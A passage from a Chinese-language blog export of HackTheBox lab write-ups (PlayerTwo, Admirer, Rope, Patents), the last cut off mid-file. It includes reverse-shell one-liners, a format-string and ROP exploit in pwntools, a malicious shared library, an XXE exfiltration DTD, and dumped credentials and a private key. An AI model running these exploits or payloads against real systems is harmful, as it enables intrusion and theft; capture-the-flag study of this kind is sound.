\"Lp-+Q8umLW5*7qkc\"name: \"0xdf\" pass: \"Lp-+Q8umLW5*7qkc\"name: \"snowscan\" pass: \"ze+EKe-SGF^5uZQX\"name: \"mprox\" pass: \"ze+EKe-SGF^5uZQX\"name: \"mprox\" pass: \"XHq7_WJTA?QD_?E2\" 处理成常规用户名密码字典： 12345678910111213141516171819 cat userpass.txt | awk '&#123;print $2,$4&#125;' | sed 's/\"//g' | sed 's/ /:/g' &gt; userpass2.txtcat userpass2.txt:mprox:Lp-+Q8umLW5*7qkcjkr:ze+EKe-SGF^5uZQXsnowscan:tR@dQnwnZEk95*6#jkr:tR@dQnwnZEk95*6#0xdf:XHq7_WJTA?QD_?E2mprox:tR@dQnwnZEk95*6#jkr:Lp-+Q8umLW5*7qkc0xdf:ze+EKe-SGF^5uZQX0xdf:tR@dQnwnZEk95*6#jkr:XHq7_WJTA?QD_?E2snowscan:XHq7_WJTA?QD_?E2snowscan:Lp-+Q8umLW5*7qkc0xdf:Lp-+Q8umLW5*7qkcsnowscan:ze+EKe-SGF^5uZQXmprox:ze+EKe-SGF^5uZQXmprox:XHq7_WJTA?QD_?E2 爆破之后使用生成的字典进行爆破 1234hydra -C userpass.txt product.player2.htb http-post-form \"/index:username=^USER^&amp;password=^PASS^&amp;Submit=Sign in:Nope\"[80][http-post-form] host: product.player2.htb login: mprox password: tR@dQnwnZEk95*6#[80][http-post-form] host: product.player2.htb login: 0xdf password: XHq7_WJTA?QD_?E2 得到两组账号密码，可用，但还需要OTP： client.sh12345678910111213#/usr/env/bashecho \"Finding Credentials...\"for i in `seq 1 100`docurl -s -X POST -H \"Content-Type: application/protobuf\" \\http://player2.htb:8545/twirp/twirp.player2.auth.Auth/GenCreds \\| ./bin/protoc -I . --decode twirp.player2.auth.Creds generated.proto \\| tr '\\n' ' ' &gt;&gt; userpass.txtecho &gt;&gt; userpass.txtdoneecho \"Unique Credentials:\"gawk -i inplace '!a[$0]++' userpass.txtcat userpass.txt totp直接POST访问： 加上action： 这里尝试一些常见OTP参数，得到正确的backup_codes： 使用这个OTP代码可以成功登录： 2FA bypass应该是后端代码实现问题，action直接使用true即可通过校验： 后端代码应该是类似这种,PHP弱类型： 123if($action == \"backup_codes\") &#123;// Send backup code&#125; 固件access那里给了一份文档是关于Protobs Firmware的，里面有固件下载链接和测试地址： http://product.player2.htb/protobs/protobs_firmware_v1.0.tar 12345678wget http://product.player2.htb/protobs/protobs_firmware_v1.0.tartar xvf protobs_firmware_v1.0.tarx info.txtx Protobs.binx versionfile Protobs.binProtobs.bin: data 直接上传这个固件是all check pass： 固件提取直接binwalk分析bin文件，里面是一个64位elf： 12345 binwalk Protobs.binDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------64 0x40 ELF, 64-bit LSB executable, AMD x86-64, version 1 (SYSV) 文档说明是签名在实际的固件代码之前，即前64个字节是签名，我们可以排除这部分，提取出elf： 1234567891011binwalk --dd='.*' Protobs.bincd _Protobs.bin.extractedls -latotal 40drwxr-xr-x@ 3 miao staff 96 6 29 15:51 .drwxr-xr-x@ 8 miao staff 256 6 29 15:51 ..-rw-r--r-- 1 miao staff 17200 6 29 15:51 40mv 40 protobs.elffile protobs.elfprotobs.elf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=82adae308a0023a272e626bbe83d97b2b9c630f6, for GNU/Linux 3.2.0, not stripped 逆向分析直接把提取出来的elf扔到ghidra里 mainmain函数调用wait_for_fkey之后继续执行： wait_for_fkey这个函数使用system调用stty命令更改终端设置，我们前面已经知道上传的固件验证通过后会执行，那么我们可以考虑修改固件使其执行恶意命令： Signature因为固件会校验签名，根据文档签名算法： 根据上面的签名过程，我们看到签名是使用program code和哈希函数计算的。 服务器可能会忽略program code的某些初始字节，这将使我们绕过验证。我们可以尝试直接修改固件bin文件后重新打包 固件修改修改固件中system执行的字符串，之后重新打包，上传，getshell： 123bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.46/7777 0&gt;&amp;1\";tar cvf shell2.tar Protobs.bin info.txt version 文件上传另一种方式，固件上传测试那里打包上传shell： 123456tar cvf shell.tar Protobs.bin info.txt version shella Protobs.bina info.txta versiona shella shell/shell.php MQTT上述两种方式都能得到www-data用户shell，继续查看信息： 12345678ps auxww...mosquit+ 1137 0.0 0.2 48024 5792 ? S 04:40 0:02 /usr/sbin/mosquitto -c /etc/mosquitto/mosquitto.conf...netstat -antp | grep LIST...tcp 0 0 127.0.0.1:1883 0.0.0.0:* LISTEN... Mosquitto是一个开源的MQTT代理，用于在使用设备或传感器时传递消息，它使用基于发布-订阅模型的mqtt协议。 每个客户端都可以订阅主题，以及发布与这些主题有关的信息。 netstat查看1883端口开着，这是mosquito server的默认端口。 端口转发我们可以通过www-data的shell加载个meterpreter，方便操作，将1883端口进行转发： 之后直接访问我们本地1883端口就相当于访问远程机器localhost的1883: 1234567891011121314151617181920212223242526272829303132mosquitto_sub -t '$SYS/#' -h 127.0.0.1 -p 1883...Retrieving the key from aws instanceKey retrieved..-----BEGIN RSA PRIVATE KEY-----MIIEpAIBAAKCAQEA7Gc/OjpFFvefFrbuO64wF8sNMy+/7miymSZsEI+y4pQyEUBAR0JyfLk8f0SoriYk0clR/JmY+4mK0s7+FtPcmsvYgReiqmgESc/brt3hDGBuVUr4et8twwy77KkjypPy4yB0ecQhXgtJNEcEFUj9DrOq70b3HKlfu4WzGwMpOsAAdeFT+kXUsGy+Cp9rp3gS3qZ2UGUMsqcxCcKhn92azjFoZFMCP8g4bBXUgGp4CmFOtdvzSM29st5P4Wqn0bHxupZ0ht8g30TJd7FNYRcQ7/wGzjvJzVBywCxirkhPnv8sQmdE+UAakPZsfw16u5dDbz9JElNbBTvwO9chpYIs0QIDAQABAoIBAA5uqzSB1C/3xBWd62NnWfZJ5i9mzd/fMnAZIWXNcA1XIMte0c3H57dnk6LtbSLcn0jTcpbqRaWtmvUNwANiwcgNg9U1vS+MFB7xeqbtUszvoizA2/ScZW3P/DURimbWq3BkTdgVOjhElh6D62LlRtW78EaVXYa5bGfFXM7cXYsBibg1+HOLon3Lrq42j1qTJHH/oDbZzAHTo6IO91TvZVnms2fGYTdATIestpIRkfKr7lPkIAPsU7AeI5iAi1442Xv1NvGG5WPhNTFCgw4R0V+96fOtYrqDaLiBeJTMRYp/eqYHXg4wyF9ZEfRhFFOrbLUHtUIvkFI0Ya/YQACn17UCgYEA/eI6xY4GwKxV1CvghL+aYBmqpD84FPXLzyEoofxctQwcLyqc5k5fllga+8yZZyeWB/rWmOLSmT/41Z0j6an0bLPe0l9okX4j8WOSmO6TisD4WiFjdAosJqiQej4Jch4fTJGegctyaOwsIVvP+hKRvYIwO9CKsaAgOQySlxQBOwMCgYEA7l+3JloRxnCYYv+eO94sNJWAxAYrcPKP6nhFc2ReZEyrPxTezbbUlpAHf+gVJNVdetMtioLhQPUNCb3mpaoP0mUtTmpmkcLbi3W25xXfgTiX8e6ZWUmw+6t2uknttjti97dPQFwjZX6QPZu4ToNJczathY2+hREdxR5hR6WrJpsCgYEApmNIz0ZoiIepbHchGv8Tpp3Lpv9DuwDoBKSfo6HoBEOeiQ7ta0a8AKVXceTCOMfJ3Qr475PgH828QAtPiQj4hvFPPCKJPqkj10TBw/a/vXUAjtlI+7ja/K8GmQblW+P/8UeSUVBLeBYoSeiJIkRfPYsAH4NqEkV2OM1TmS3kLI8CgYBne7AD+0gKMOlG2Re1f88LCPg8oT0MrJDjxlDINoNv4YTaPtI21i9WKbLHyVYchnAtmS4FGqp1S6zcVM+jjb+OpBPWHgTnNIOg+HptuaYs8AeupNl31LD7oMVLPDrxSLi/N5o1I4rOTfKKfGa31vD1DoCoIQ/brsGQyI6MzxQNDwKBgQCBOLY8aLyv/Hi0l1Ve8Fur5bLQ4BwimY3TsJTFFwU4IDFQY78AczkK/1i6dn3iKSmL75aVKgQ5pJHkPYiTWTRq2a/y8g/leCrvPDM19KB5Zr0Z1tCw5XCziZHQGq04r9PMTAFTmaQfMzDy1Hfo8kZ/2y5+2+lC7wIlFMyYze8n8g==-----END RSA PRIVATE KEY-----... 我们得到了一个ssh私钥 user flag查看home目录可以得到用户名observer，直接使用刚得到私钥登录就可以： 提权 二进制打法二进制方法是用UAF，heap太烦了，直接参考官方wp吧 root flag 非预期123cd .sshmv id_rsa id_rsa_oldln -s /root/root.txt id_rsa 因为前面mqtt能够看到是会读取id_rsa并且显示出来， 查看进程能够看到root运行的/root/broadcast.py，那么直接将id_rsa软链接到root.txt即可非预期读取root.txt内容 参考资料 https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt https://en.wikipedia.org/wiki/Time-based_One-time_Password_algorithm https://github.com/twitchtv/twirp/blob/master/docs/routing.md https://twitchtv.github.io/twirp/docs/curl.html https://github.com/protocolbuffers/protobuf/releases HTB: PlayerTwo | 0xdf hacks stuffhttps://0xdf.gitlab.io/2020/06/27/htb-playertwo.html#serverphp https://www.hackthebox.eu/home/machines/writeup/221 HackTheBox - Player2 - YouTubehttps://www.youtube.com/watch?v=ehoh6g5dSWk","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Admirer - HackTheBox","slug":"Admirer-HackTheBox","date":"2020-06-16T07:18:31.000Z","updated":"2020-09-27T01:22:12.538Z","comments":true,"path":"2020/06/16/Admirer-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/06/16/Admirer-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/248 10.10.10.187 端口扫描21,22,80几个端口： 80根据扫描结果，robots.txt中得到admin-dir目录，直接访问是403: 扫描目录,这里字典很重要，因为包含敏感信息的credentials.txt，一般字典里没有： credentials.txt1234567891011[Internal mail account]w.cooper@admirer.htbfgJr6q#S\\W:$P[FTP account]ftpuser%n?4Wz&#125;R$tTF7[Wordpress account]adminw0rdpr3ss01! FTP使用得到的ftp账号密码登录，发现两个文件： index.php下载源码解压，index.php中得到数据库信息,但是数据库没有对外开放端口： 1234$servername = \"localhost\";$username = \"waldo\";$password = \"]F7jLHw:*G&gt;UPrTo&#125;~A\"d6b\";$dbname = \"admirerdb\"; utility-scripts/admin-task.php根据输入的task id执行脚本: 12345678910111213141516171819202122232425&lt;?php &#x2F;&#x2F; Web Interface to the admin_tasks script &#x2F;&#x2F; if(isset($_REQUEST[&#39;task&#39;])) &#123; $task &#x3D; $_REQUEST[&#39;task&#39;]; if($task &#x3D;&#x3D; &#39;1&#39; || $task &#x3D;&#x3D; &#39;2&#39; || $task &#x3D;&#x3D; &#39;3&#39; || $task &#x3D;&#x3D; &#39;4&#39; || $task &#x3D;&#x3D; &#39;5&#39; || $task &#x3D;&#x3D; &#39;6&#39; || $task &#x3D;&#x3D; &#39;7&#39;) &#123; &#x2F;*********************************************************************************** Available options: 1) View system uptime 2) View logged in users 3) View crontab (current user only) 4) Backup passwd file (not working) 5) Backup shadow file (not working) 6) Backup web data (not working) 7) Backup database (not working) NOTE: Options 4-7 are currently NOT working because they need root privileges. I&#39;m leaving them in the valid tasks in case I figure out a way to securely run code as root from a PHP page. ************************************************************************************&#x2F; echo str_replace(&quot;\\n&quot;, &quot;&lt;br &#x2F;&gt;&quot;, shell_exec(&quot;&#x2F;opt&#x2F;scripts&#x2F;admin_tasks.sh $task 2&gt;&amp;1&quot;)); &#125; utility-scripts/db-admin.php 也是数据库信息： 1234567891011121314151617&lt;?php $servername = \"localhost\"; $username = \"waldo\"; $password = \"Wh3r3_1s_w4ld0?\"; // Create connection $conn = new mysqli($servername, $username, $password); // Check connection if ($conn-&gt;connect_error) &#123; die(\"Connection failed: \" . $conn-&gt;connect_error); &#125; echo \"Connected successfully\"; // TODO: Finish implementing this or find a better open source alternative?&gt; 里面包含一句提示信息，直接尝试访问 http://10.10.10.187/utility-scripts/db_admin.php 是404，说明作者找到了更好的开源方案，这里需要根据靶机名Admirer想到adminer(以前叫做phpMyAdmin) adminer.php 但使用前面得到的那些账号密码无法登录，继续查找信息，注意版本，Adminer 4.6.2, 找到相关漏洞： Serious Vulnerability Discovered in Adminer database Administration Toolhttps://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool mysql client 文件读取其实就是load data lcoal infidel，我们自己做一个server，让客户端连接，读取客户端的任意文件，直接用bettercap就可以做,因为前面知道index.php中存在密码，就直接读取index.php: 1sudo bettercap -iface utun2 -eval \"set mysql.server.infile ../index.php; mysql.server on\" 1234$servername = \"localhost\";$username = \"waldo\";$password = \"&amp;&lt;h5b~yK3F#&#123;PaPB&amp;dA&#125;&#123;H&gt;\";$dbname = \"admirerdb\"; user flag这个账号密码可以ssh登录，得到user.txt: 提权信息sudo -l发现： (ALL) SETENV: /opt/scripts/admin_tasks.sh admin_task.sh中 12345678910backup_web()&#123; if [ \"$EUID\" -eq 0 ] then echo \"Running backup script in the background, it might take a while...\" /opt/scripts/backup.py &amp; else echo \"Insufficient privileges to perform the selected operation.\" fi&#125; 这个函数调用了同目录下的backup.py文件，这个文件使用shutil中的make_archive函数，注意前面我们有SETENV权限，可以考虑做一个恶意函数，并且修改环境变量，这里Python使用的是PYTHONPATH： 提权设置环境变量，运行，触发恶意函数： root flag反弹shell，得到root.txt: 参考资料 Serious Vulnerability Discovered in Adminer database Administration Toolhttps://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool https://www.bettercap.org/modules/ethernet/servers/mysql.server/ Privilege Escalation via Python Library Hijacking | rastating.github.iohttps://rastating.github.io/privilege-escalation-via-python-library-hijacking/ Hack The Box : Admirer - Atsikahttps://atsika.info/htb-admirer/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Rope - HackTheBox","slug":"Rope-HackTheBox","date":"2020-05-27T04:38:18.000Z","updated":"2020-05-27T04:39:31.526Z","comments":true,"path":"2020/05/27/Rope-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/05/27/Rope-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/200 10.10.10.148 端口扫描只有22和9999 9999直接访问是一个登录页面： 目录遍历简单的扫描后可以发现一个目录遍历： /opt/www/run.sh123456#!/bin/bashsource /home/john/.bashrcwhile true;do cd /opt/www;./httpserver;done 根据这个文件，我们可以下载运行的httpserver二进制文件 1wget http://10.10.10.148:9999//opt/www/httpserver httpserver 逆向分析32位elf，保护全开，那就先看下大概流程： 首先是一些初始设置，然后调用了open_listenfd函数绑定到9999端口接收请求： 然后循环，根据accept函数返回值来判断是否继续循环，这个应该是用于接收请求的： 之后，进入process函数，内部执行fork，然后parse_request解析请求，这个会返回请求的文件路径，之后使用open判断目标是否存在： 如果目标存在，调用fstat函数判断是文件还是目录，serve_static处理文件，handle_directory_request处理目录 可以看出serve_static支持Range header,如果请求头中 Range: bytes=0-500，则只会返回文件的前500个字节： 当这些执行完后回到process函数，会执行log_access，日志记录功能，这个函数三个参数分别是状态码， sockaddr，低三个参数包含请求文件路径： 注意这个函数，里面直接调用使用第三个参数调用了printf函数，没有格式化控制，所以这里是一个很明显的格式化字符串漏洞 格式化字符串本地运行httpserver进行调试，直接用pwntools构造TTP请求： 123456789101112#!/usr/bin/pythonfrom pwn import *from urllib import quoter = remote('10.211.55.9', 9999)payload = quote(\"AAAAAAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x\")r.sendline(\"GET /&#123;&#125; HTTP/1.1\\n\".format(payload))r.close() 查看server的log： 修改payload进一步测试： 1payload = quote(\"AAAAAAAA\" + \".%x\" * 100 ) AAAA的hex是41414141， 查看log能够看到： 因为我们用点分隔，可以很容易的得到偏移： 修改payload进行确认： 1payload = quote(\"AAAAAAAA.%53$x.%54$x\") 另外前面的log_access函数在printf之后调用了puts，我们可以使用格式化字符串漏洞修改puts函数的GOT，将其修改为例如system函数，因为是puts(request method),我们就可以修改method执行任意命令。 但是因为有PIE (Position Independent Executable) ，程序每次运行地址都是不同的，首先需要解决这个问题。 /proc/self/maps我们有任意文件读取，可以通过/proc/self/maps获得程序和libc的地址，注意这个文件访问是空，因为/proc是一个虚拟文件系统，我们可以使用range： parseMaps get addr解析得到的maps，获得address： 1234567891011121314151617181920212223242526272829#!/usr/bin/pythonfrom pwn import *from urllib import quotefrom requests import getr = remote('10.211.55.9', 9999)def parseMaps(maps): binary_base = int(maps[0].split('-')[0], 16) libc_base = int(maps[6].split('-')[0], 16) return binary_base, libc_base def getMaps(): headers = &#123; \"Range\" : \"bytes=0-1000\" &#125; maps = get(\"http://10.211.55.9:9999//proc/self/maps\", headers = headers) return parseMaps(maps.content.splitlines()) binary_base, libc_base = getMaps()log.success(\"Binary base address: &#123;&#125;\".format(hex(binary_base)))log.success(\"Libc base address: &#123;&#125;\".format(hex(libc_base)))# payload = quote(\"AAAAAAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x\")# payload = quote(\"AAAAAAAA\" + \".%x\" * 100 )payload = quote(\"AAAAAAAA.%53$x.%54$x\")r.sendline(\"GET /&#123;&#125; HTTP/1.1\\n\".format(payload))r.close() puts got计算出puts got地址： 1234elf = ELF(\"./httpserver\")puts_got = elf.got[\"puts\"]puts = binary_base + puts_gotlog.success(\"puts address: &#123;&#125;\".format(hex(puts))) got overwrite test使用gdb运行httpserver进行调试，注意gdb中需要： 1set follow-fork-mode child 因为程序中有fork 修改payload为： 1payload = quote(p32(puts) + \".%53$n\") 运行后发现server crash，运行到了0x000005, 我们成功修改了puts的got(地址4个字节，加上一个点，等于5)： exploit local之后就是直接使用pwntools的fmtstr_payload()一把梭： 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/pythonfrom pwn import *from urllib import quotefrom requests import getr = remote('10.211.55.9', 9999)def parseMaps(maps): binary_base = int(maps[0].split('-')[0], 16) libc_base = int(maps[6].split('-')[0], 16) return binary_base, libc_base def getMaps(): headers = &#123; \"Range\" : \"bytes=0-1000\" &#125; maps = get(\"http://10.211.55.9:9999//proc/self/maps\", headers = headers) return parseMaps(maps.content.splitlines()) binary_base, libc_base = getMaps()log.success(\"Binary base address: &#123;&#125;\".format(hex(binary_base)))log.success(\"Libc base address: &#123;&#125;\".format(hex(libc_base)))elf = ELF(\"./httpserver\")puts_got = elf.got[\"puts\"]puts = binary_base + puts_gotlog.success(\"puts address: &#123;&#125;\".format(hex(puts)))libc = ELF(\"./libc-2.27.so\")system_libc = libc.symbols[\"system\"]system = libc_base + system_libclog.success(\"system address: &#123;&#125;\".format(hex(system)))# payload = quote(\"AAAAAAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x\")# payload = quote(\"AAAAAAAA\" + \".%x\" * 100 )# payload = quote(\"AAAAAAAA.%53$x.%54$x\")# payload = quote(p32(puts) + \".%53$n\")payload = fmtstr_payload(53, &#123; puts : system &#125;)r.sendline(\"GET &#123;&#125; HTTP/1.1\\n\".format(quote(payload)))r.close() 查看log，发现尝试执行GET，成功将puts修改为system： 之后将method修改为要执行的命令即可getshell： 12345echo -n 'bash -i &gt;&amp; /dev/tcp/10.211.55.2/7777 0&gt;&amp;1' | base64YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMTEuNTUuMi83Nzc3IDA+JjE=cmd = \"echo$&#123;IFS&#125;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMTEuNTUuMi83Nzc3IDA+JjE=|base64$&#123;IFS&#125;-d|bash\"r.sendline(\"&#123;&#125; &#123;&#125; HTTP/1.1\\n\".format(cmd, quote(payload))) exploit remoteremote libc: 1wget http://10.10.10.148:9999//lib32/libc.so.6 简单修改代码即可： 立足得到的shell是john用户，user.txt不在这个用户目录，为了方便后续操作可以把ssh公钥写进去直接通过ssh连接： readlogssudo -l可以看到john用户可以无需密码以r4j用户身份运行/usr/bin/readlogs： 逆向分析ldd发现readlogs使用了一个自定义的liblog.so，我们将其下载下来分析： 12scp john@10.10.10.148:/usr/bin/readlogs .scp john@10.10.10.148:/lib/x86_64-linux-gnu/liblog.so . 很容易可以看到，readlogs调用了liblog.so中定义的printlog函数，这个函数直接使用了system： 并且liblog.so文件是777权限，那么我们就可以考虑动态连结库注入，自己编译一个so替换这个文件执行任意命令： 恶意so12345678cat printlog.cvoid printlog()&#123; system(\"/bin/bash\");&#125;gcc printlog.c -o printlog.so -sharedchmod 777 printlog.soscp printlog.so john@10.10.10.148:/lib/x86_64-linux-gnu/liblog.so user flag然后执行一次readlogs就会调用我们的so，得到r4j的shell，用户目录得到user.txt: 同样添加公钥便于后续操作 收集信息12345678910ps aux | grep root...root 1073 0.0 0.0 4628 852 ? Ss 04:41 0:00 &#x2F;bin&#x2F;sh -c &#x2F;opt&#x2F;support&#x2F;contact...file &#x2F;opt&#x2F;support&#x2F;contact&#x2F;opt&#x2F;support&#x2F;contact: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 3.2.0, BuildID[sha1]&#x3D;cc3b330cabc203d0d813e3114f1515b044a1fd4f, strippedscp r4j@10.10.10.148:&#x2F;opt&#x2F;support&#x2F;contact . concat 逆向分析64位elf，保护全开： 1234567checksec ./contact[*] './contact' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 测试运行以及查看字符串，这个也是监听端口接收请求： 监听1337端口接收请求，然后调用FUN_001014ee函数 这个函数内部执行fork，使用write函数作为响应, 然后调用FUN_0010159a函数： 这个函数使用recv读取0x400，负责接收的local_48只有56，明显的溢出，但存在canary，无法直接利用 debug调试运行，发送57个字节造成溢出： 我这里因为18.04 ubuntu的对齐问题，懒得这趟了，直接用官方wp里的结果，主要是看布局： 1234567891011121314151617gef➤ n&lt;SNIP&gt;gef➤ stack─────────────────────── Stack bottom (lower address)──────────────────────0x00007fffffffe410│+0x0000: 0x0000000000000000 ← $rsp0x00007fffffffe418│+0x0008: 0x00000004000000000x00007fffffffe420│+0x0010: &quot;AAAA&lt;SNIP&gt;AAAAAA[...]&quot; ← $rsi0x00007fffffffe428│+0x0018: &quot;AAAAAA&lt;SNIP&gt;AAAAA\\n[...]&quot;0x00007fffffffe430│+0x0020: 0x41414141414141410x00007fffffffe438│+0x0028: 0x41414141414141410x00007fffffffe440│+0x0030: 0x41414141414141410x00007fffffffe448│+0x0038: 0x41414141414141410x00007fffffffe450│+0x0040: 0x41414141414141410x00007fffffffe458│+0x0048: 0xd86036e0540b060a0x00007fffffffe460│+0x0050: 0x00007fffffffe490 ← $rbp0x00007fffffffe468│+0x0058: 0x0000555555555562 → mov eax, DWORD PTR [rbp0x14] ($savedip)─────────────────────────── Stack top (higher address) ────── rbp是0x00007fffffffe460，canary在它上面，下面是savedip 爆破canary首先需要利用响应差异来爆破canary(可能会因为各种原因出错，多试几次，或者重启机器)： RBP &amp; return addr &amp; leak同样的方法爆破RBP和savedip，即return address，这个地址能够帮助我们计算出binary的基地址（相对偏移可以调试得到，vmmap得到binary基础地址，和rip计算出偏移，比如官方wp是0x1562，我本地就是0x1556），从而计算出其他函数地址，构造rop，leak addr： exploit Development之后就是常规的rop exp，因为server fd是4，用dup2处理stdin和stdout 12dup2(4, 0);dup2(4, 1); 本地测试就直接使用已经爆破得到的那几个数值了，另外one_gadget地址也需要自己修改对应的： 完整exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126from pwn import *import syscontext.log_level = 'debug'def getByte(chars): for ch in range(0x00, 0x100): r = remote('localhost', 1337, level='error') payload = \"A\" * 56 + chars + chr(ch) r.recvline() r.send(payload) try: resp = r.recvline(timeout=2).rstrip() if \"Done.\" == resp: r.close() return ch except: sys.stdout.write('&#123;:02x&#125;\\x08\\x08'.format(ch)) pass r.close()def getCanary(): canary = '' sys.stdout.write(\"Canary: \") while len(canary) != 8: ch = getByte(canary) canary += chr(ch) sys.stdout.write('&#123;:02x&#125;'.format(ch)) return canarydef getContent(chars): content = '' while len(content) != 8: ch = getByte(chars + content) content += chr(ch) sys.stdout.write('&#123;:02x&#125;'.format(ch)) return contentsys.stdout.write(\"Canary: \")canary = getContent('')print ''log.success(\"Canary found: &#123;&#125;\\n\".format(hex(u64(canary))))sys.stdout.write(\"RBP: \")rbp = getContent(canary)print ''log.success(\"RBP found: &#123;&#125;\\n\".format(hex(u64(rbp))))sys.stdout.write(\"Saved return address: \")savedRip = u64(getContent(canary + rbp))print ''log.success(\"Saved return address found: &#123;&#125;\\n\".format(hex(savedRip)))e = ELF(\"./contact\")binaryBase = savedRip - 0x1562pieAddr = lambda addr: addr + binaryBase'''0x0000000000001265: pop rdx; ret;'''pop_rdx = p64(pieAddr(0x1265))'''0x0000000000001649: pop rsi; pop r15; ret;'''pop_rsi_r15 = p64(pieAddr(0x1649))'''0x000000000000164b: pop rdi; ret;'''pop_rdi = p64(pieAddr(0x164b))write_GOT = p64(pieAddr(e.got['write']))write = p64(pieAddr(e.symbols['write']))chain = \"A\" * 56 + canary + rbp# overwrite return addresschain += pop_rdx + p64(0x8)chain += pop_rsi_r15 + write_GOT + \"B\" * 8 # junkchain += write # call write function'''write(fd, write@GOT, 0x8)'''r = remote('localhost', 1337, level='error')r.recvline()r.send(chain)write_libc = u64(r.recv(8))log.success(\"Leaked write@libc: &#123;&#125;\".format(hex(write_libc)))r.close()libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")libc_base = write_libc - libc.symbols['write'] # Find libc base addresslog.success(\"Libc based address: &#123;&#125;\".format(hex(libc_base)))dup2 = p64(libc_base + libc.symbols['dup2']) # Calculate dup2 address'''0x4f322 execve(\"/bin/sh\", rsp+0x40, environ)constraints: [rsp+0x40] == NULL'''one_gadget = p64(libc_base + 0x4f322)chain = \"A\" * 56 + canary + rbp# overwrite return addresschain += pop_rdi + p64(0x4) # oldfdchain += pop_rsi_r15 + p64(0x0) + \"JUNKJUNK\" # newfd : stdinchain += dup2 # call dup2'''dup2(0, 4);'''chain += pop_rdi + p64(0x4) # oldfdchain += pop_rsi_r15 + p64(0x1) + \"JUNKJUNK\" # newfd : stdoutchain += dup2 # call dup2'''dup2(1, 4);'''chain += pop_rdx + p64(0x0) # Zero out rdxchain += pop_rsi_r15 + p64(0x0) + \"JUNKJUNK\" # Zero out rsichain += one_gadget # call execve'''execve(\"/bin/sh\", NULL, NULL);'''log.info(\"Sending final payload\")r = remote('localhost', 1337, level='error')r.recvline()r.send(chain)r.interactive() exploit remote这一步就是通过前面拿到的ssh下载远程libc，转发1337端口到本地，然后修改exp中的libc，偏移，one_gadget,（打远程会非常慢，尤其是爆破的过程中别人把机器reset了。。。）,所以这里没有结果图，本地打通完事了，放弃远程了： 12scp r4j@10.10.10.148:&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 .&#x2F;libc_rope.sossh -L 1337:127.0.0.1:1337 r4j@10.10.10.148 所以这台机器整体知识点不难，虽然是50分 Insane级别，但主要都是在爆破花费的时间上 参考资料 https://www.hackthebox.eu/home/machines/writeup/200 HackTheBox - Rope - YouTubehttps://www.youtube.com/watch?v=GTQxZlr5yvE&amp;t=2s","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Patents - HackTheBox","slug":"Patents-HackTheBox","date":"2020-05-21T05:04:20.000Z","updated":"2020-05-21T05:05:45.669Z","comments":true,"path":"2020/05/21/Patents-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/05/21/Patents-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/224 10.10.10.173 端口扫描 80 一个Patents管理系统，存在一个上传接口，上传docx转换成pdf： 目录扫描1gobuster dir -u http:&#x2F;&#x2F;10.10.10.173&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt -x php -b 403,404 发现一个release目录，进一步扫描： 发现更新log文件： http://10.10.10.173/release/UpdateDetails 里面提到Docx2Pdf的相关漏洞 docx xxedocx解压后里面是xml文件，可以尝试进行XXE： 添加一个xml进去，重新打包成docx： 监听端口，上传生成的docx，收到请求，说明存在XXE： 接下来需要做的就是通过XXE读取文件搜集信息 XXE LFI12345678910111213$ cat read.dtd&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt;&lt;!ENTITY % read &quot;&lt;!ENTITY exfil SYSTEM &#39;http:&#x2F;&#x2F;10.10.14.106:7777&#x2F;exfil?%file;&#39;&gt;&quot;&gt;cat customXml&#x2F;item1.xml&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;10.10.14.106:7777&#x2F;read.dtd&quot;&gt;%xxe;%read;]&gt;&lt;foo&gt;&amp;exfil;&lt;&#x2F;foo&gt; 上传，收到请求，base64解码后是读取的文件内容： /etc/passwd 得到一个用户名 ： gbyolo /etc/apache2/sites-enabled/000-default.conf前面扫描结果中有config.php，但直接去读/var/www/html/config.php是失败的，应该不是在默认的根目录，所以先读配置文件： 1234567891011121314&lt;VirtualHost *:80&gt; DocumentRoot &#x2F;var&#x2F;www&#x2F;html&#x2F;docx2pdf &lt;Directory &#x2F;var&#x2F;www&#x2F;html&#x2F;docx2pdf&#x2F;&gt; Options -Indexes 